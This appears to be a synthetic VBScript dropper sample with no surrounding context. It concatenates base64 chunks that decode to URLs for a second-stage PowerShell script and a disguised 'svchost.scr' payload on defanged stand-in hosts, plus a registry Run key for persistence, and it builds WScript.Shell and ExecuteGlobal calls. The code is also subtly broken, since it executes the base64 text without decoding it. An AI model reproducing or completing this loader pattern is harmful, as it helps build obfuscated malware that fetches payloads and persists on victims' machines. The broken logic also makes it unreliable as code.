Part1 = "c3RhZ2UyID0gImh4eHBzOi8vZ2l0aHViLmV4YW1wbGUuaW52YWxpZC9yYXcva2" & "lyYS5wczEiCmRyb3Bib3hfcGF5bG9hZCA9ICJoeHhwczovL2Ryb3Bib3guZXhh"
' generated-noise
unused_generated = "AAAA"

Part2 = "bXBsZS5pbnZhbGlkL3N2Y2hvc3Quc2NyIgpydW5fa2V5ID0gIkhLQ1VcU29mdH" & "dhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXHN2YyI="
blob = Part1 & Part2
blob = Replace(blob, " ", "")
engine = "WScript" & ".Shell"
repo = "hxxps://github.example.invalid/" & "raw/refs/heads/main/install.exe"
stage = "hxxps://dropbox.examp" & "le.invalid/svchost.scr"
ExecuteGlobal blob